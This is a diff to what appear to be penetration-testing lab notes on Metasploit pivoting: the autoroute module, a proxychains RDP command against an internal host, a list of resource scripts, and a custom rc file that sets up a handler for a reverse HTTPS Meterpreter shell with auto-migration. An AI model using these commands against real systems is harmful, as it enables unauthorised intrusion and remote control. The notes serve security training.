@@ -108,6 +108,15 @@ set PORTS TARGET_PORTS                 // Suggester: 445, 3389. If the SMB ports
 run
 ```
 
+Instead of adding manual routes, `autoroute` can be used too:
+```
+use multi/manage/autoroute
+sessions -l 
+set session SESSION_ID
+run
+```
+
+
 First, make sure that the `/etc/proxychains.conf` port is set to `1080`.
 
 ```
@@ -120,7 +129,7 @@ set SRVHOST 127.0.0.1
 run -j
 
 // Regular commands can now be ran
-proxychains xfreerdp /v:
+proxychains xfreerdp /v:172.16.5.200 /u:luiza
 
 ```
 
@@ -148,3 +157,63 @@ portfwd add -l 3389 -p 3389 -r 172.16.5.200
 xfreerdp /v:127.0.0.1 /u:USER
 ```
 
+#### Automation
+Using Metasploit *Recourse Scripts*, exploits can be chained together, managed more easily, or otherwise handled more conveniently.
+To list them:
+```
+ls -l /usr/share/metasploit-framework/scripts/resource
+```
+
+##### Example output
+```
+┌─[root@edu-virtualbox]─[/tmp/oscp]
+└──╼ #ls -l /usr/share/metasploit-framework/scripts/resource
+total 156
+-rw-r--r-- 1 root root  7270 22 nov 23:09 auto_brute.rc
+-rw-r--r-- 1 root root  2203 22 nov 23:09 autocrawler.rc
+-rw-r--r-- 1 root root 11225 22 nov 23:09 auto_cred_checker.rc
+-rw-r--r-- 1 root root  6565 22 nov 23:09 autoexploit.rc
+-rw-r--r-- 1 root root  3422 22 nov 23:09 auto_pass_the_hash.rc
+-rw-r--r-- 1 root root   876 22 nov 23:09 auto_win32_multihandler.rc
+-rw-r--r-- 1 root root   155 22 nov 23:09 bap_all.rc
+-rw-r--r-- 1 root root   762 22 nov 23:09 bap_dryrun_only.rc
+-rw-r--r-- 1 root root   365 22 nov 23:09 bap_firefox_only.rc
+-rw-r--r-- 1 root root   358 22 nov 23:09 bap_flash_only.rc
+-rw-r--r-- 1 root root   354 22 nov 23:09 bap_ie_only.rc
+-rw-r--r-- 1 root root 20767 22 nov 23:09 basic_discovery.rc
+-rw-r--r-- 1 root root  4518 22 nov 23:09 dev_checks.rc
+-rw-r--r-- 1 root root  3358 22 nov 23:09 fileformat_generator.rc
+-rw-r--r-- 1 root root  1319 22 nov 23:09 meterpreter_compatibility.rc
+-rw-r--r-- 1 root root  1064 22 nov 23:09 mssql_brute.rc
+-rw-r--r-- 1 root root  4346 22 nov 23:09 multi_post.rc
+-rw-r--r-- 1 root root  1222 22 nov 23:09 nessus_vulns_cleaner.rc
+-rw-r--r-- 1 root root  1659 22 nov 23:09 oracle_login.rc
+-rw-r--r-- 1 root root   840 22 nov 23:09 oracle_sids.rc
+-rw-r--r-- 1 root root   490 22 nov 23:09 oracle_tns.rc
+-rw-r--r-- 1 root root   833 22 nov 23:09 port_cleaner.rc
+-rw-r--r-- 1 root root  2419 22 nov 23:09 portscan.rc
+-rw-r--r-- 1 root root  1251 22 nov 23:09 run_all_post.rc
+-rw-r--r-- 1 root root   333 22 nov 23:09 run_cve-2022-22960_lpe.rc
+-rw-r--r-- 1 root root  3084 22 nov 23:09 smb_checks.rc
+-rw-r--r-- 1 root root  3837 22 nov 23:09 smb_validate.rc
+-rw-r--r-- 1 root root  2592 22 nov 23:09 wmap_autotest.rc
+```
+
+To use a script:
+```
+set AutoRunScript AUTORUNSCRIPT
+```
+##### Custom rc creation
+test.rc:
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate              // Will create a notepad.exe process and migrade to it, to prevent the session from being killed.
+set ExitOnSession false                                    // Be able to handle multiple sessions
+```
+To use:
+```
+msfconsole -r test.rc
+```
